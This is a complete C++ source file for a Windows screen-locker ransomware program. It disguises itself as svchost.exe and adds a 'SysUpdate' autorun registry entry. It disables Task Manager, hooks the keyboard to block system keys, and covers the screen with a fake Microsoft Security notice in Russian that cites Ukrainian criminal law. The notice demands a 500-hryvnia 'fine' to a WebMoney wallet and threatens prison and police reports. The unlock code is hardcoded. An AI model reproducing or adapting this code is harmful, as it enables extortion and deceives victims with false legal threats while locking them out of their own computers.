// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>

#pragma execution_character_set("utf-8") // Принудительно UTF-8 для русского текста

// Пароль для разблокировки (в данном случае "1234")
static const std::wstring kPassword = L"1234";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;

// Координаты кнопок (X, Y, Width, Height, Text)
struct Button {
    int x, y, w, h;
    std::wstring text;
};

static std::vector<Button> g_buttons;

static void InitButtons(int screenW, int screenH) {
    g_buttons.clear();
    // Центрируем клавиатуру по экрану
    int btnW = 50, btnH = 40, gap = 10;
    int totalW = 6 * (btnW + gap) - gap; 
    int startX = (screenW - totalW) / 2;
    int startY = screenH - 200; // Отступ снизу

    std::wstring keys[] = {L"1", L"2", L"3", L"4", L"5", L"6", L"7", L"8", L"9", L"0", L"<-"};
    
    for (int i = 0; i < 11; i++) {
        int row = i / 6;
        int col = i % 6;
        g_buttons.push_back({startX + col * (btnW + gap), startY + row * (btnH + gap), btnW, btnH, keys[i]});
    }
    
    // Кнопка "Разблокировать" справа от поля ввода
    g_buttons.push_back({screenW / 2 + 150, startY + 10, 200, 40, L"разблокировать"});
}

// ---------- Persistence ----------
static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

// ---------- Keyboard Hook ----------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

// ---------- Window Proc ----------
static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(TRUE); // Курсор теперь виден!
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);
        InitButtons(sw, sh);
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        
        // Фон (голубой)
        HBRUSH bg = CreateSolidBrush(RGB(0, 102, 204));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);
        
        // Темно-синяя рамка для текста
        RECT rcBox = rc; rcBox.left += 50; rcBox.top += 20; rcBox.right -= 50; rcBox.bottom -= 250; // Оставили место для кнопок
        HBRUSH boxBg = CreateSolidBrush(RGB(0, 51, 153));
        FillRect(dc, &rcBox, boxBg);
        DeleteObject(boxBg);
        
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));

        HFONT fTitle = CreateFontW(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
        HFONT fText = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
        HFONT fBtn = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
        
        // Заголовок (выровнен по центру экрана)
        SelectObject(dc, fTitle);
        RECT rcTitle = rc; rcTitle.top = 25; rcTitle.bottom = 70;
        DrawTextW(dc, L"Windows заблокирован!", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        
        // Основной текст (сдвинут вниз)
        SelectObject(dc, fText);
        RECT rcText = rcBox; rcText.left += 20; rcText.right -= 20; rcText.top += 80; 
        
        const wchar_t* mainText = 
            L"Microsoft Security обнаружил ПИРАТСКУЮ ВЕРСИЮ WINDOWS. Статья 176 УК Украины.\n"
            L"Лишение свободы до 3-ех лет. штраф в размере 9500 гривен.\n\n"
            L"Для разблокировки Windows необходимо в течении 12-ти часов оплатить ШТРАФ в размере 500 гривен.\n"
            L"В случае неуплаты штрафа в течении 12-ти часов, сумма штрафа составит 9500 гривен, а в случае отказа\n"
            L"оплаты штрафа, Вы будете привлечены к Уголовной Ответственности по статье 176 УК Украины (см. ниже).\n"
            L"Так же в случае неуплаты все Ваши данные включая: IP адрес, домашний адрес, ФИО будут переданы\n"
            L"в местное отделение полиции.\n\n"
            L"Инструкция по оплате штрафа:\n"
            L"1. Найдите ближайший терминал для оплаты мобильной связи. Например iBox.\n"
            L"2. Выберите вкладку \"Оплата услуг\" (может отличаться в зависимости от терминала).\n"
            L"3. Выберите \"Банки, страхование, Эл. коммерция\" (может отличаться от терминала).\n"
            L"4. Выберите \"WebMoney\".\n"
            L"5. Введите номер кошелька: U349966071813\n"
            L"6. Внесите в купюроприёмник сумму 500 гривен и совершите оплату.\n\n"
            L"После оплаты на валаной терминалом квитанции Вы найдете код для ВХОДА в систему. Введите его в\n"
            L"поле ниже и нажмите на \"разблокировать\". После чего данное сообщение полностью пропадет и ваш\n"
            L"компьютер будет разблокирован. Так же все штрафные санкции с Вас будут сняты.";
            
        DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);

        // Нижняя синяя плашка (Статья) прижата к низу темной рамки
        RECT rcBottom = rcBox; rcBottom.top = rcBottom.bottom - 50;
        HBRUSH botBg = CreateSolidBrush(RGB(0, 51, 153));
        FillRect(dc, &rcBottom, botBg);
        DeleteObject(botBg);
        
        RECT rcBottomText = rcBottom; rcBottomText.left += 20; rcBottomText.right -= 20;
        DrawTextW(dc, L"Ст. 176 УК Украины. Незаконное использование ПО либо другое умышленное нарушение авторского права. Лишение свободы от 3-ех лет.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_WORDBREAK);

        // Текст перед полем ввода
        RECT rcPrompt = rc; rcPrompt.top = rc.bottom - 180; rcPrompt.bottom = rc.bottom - 150; rcPrompt.left = rc.left + 200;
        DrawTextW(dc, L"Ваш код:", -1, &rcPrompt, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Поле ввода (белый прямоугольник)
        RECT rcInput = rc; rcInput.left = rc.left + 300; rcInput.top = rc.bottom - 185; rcInput.right = rc.left + 600; rcInput.bottom = rc.bottom - 145;
        HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcInput, whiteBrush);
        DeleteObject(whiteBrush);
        
        // Введенный текст в поле
        SetTextColor(dc, RGB(0, 0, 0));
        RECT rcInputText = rcInput; rcInputText.left += 10;
        DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Рисуем кнопки
        SelectObject(dc, fBtn);
        for (const auto& btn : g_buttons) {
            RECT rcBtn = {btn.x, btn.y, btn.x + btn.w, btn.y + btn.h};
            HBRUSH btnBg = CreateSolidBrush(RGB(240, 240, 240));
            FillRect(dc, &rcBtn, btnBg);
            DeleteObject(btnBg);
            FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(GRAY_BRUSH));
            
            SetTextColor(dc, RGB(0, 0, 0));
            DrawTextW(dc, btn.text.c_str(), -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }

        DeleteObject(fTitle);
        DeleteObject(fText);
        DeleteObject(fBtn);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l);
        
        for (const auto& btn : g_buttons) {
            if (x >= btn.x && x <= btn.x + btn.w && y >= btn.y && y <= btn.y + btn.h) {
                if (btn.text == L"<-") {
                    if (!g_input.empty()) g_input.pop_back();
                } else if (btn.text == L"разблокировать") {
                    if (g_input == kPassword) {
                        g_locked = false;
                        HKEY hk;
                        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                            DWORD v = 0;
                            RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                            RegCloseKey(hk);
                        }
                        UnhookWindowsHookEx(g_kbHook);
                        DestroyWindow(h);
                        PostQuitMessage(0);
                    } else {
                        g_input.clear(); // Неверный пароль
                    }
                } else {
                    if (g_input.length() < 10) g_input += btn.text;
                }
                InvalidateRect(h, nullptr, TRUE);
                break;
            }
        }
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) g_input.pop_back();
        else if (w >= '0' && w <= '9' && g_input.length() < 10) g_input.push_back((wchar_t)w);
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
             if (g_input == kPassword) {
                g_locked = false;
                HKEY hk;
                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                    DWORD v = 0;
                    RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                    RegCloseKey(hk);
                }
                UnhookWindowsHookEx(g_kbHook);
                DestroyWindow(h);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
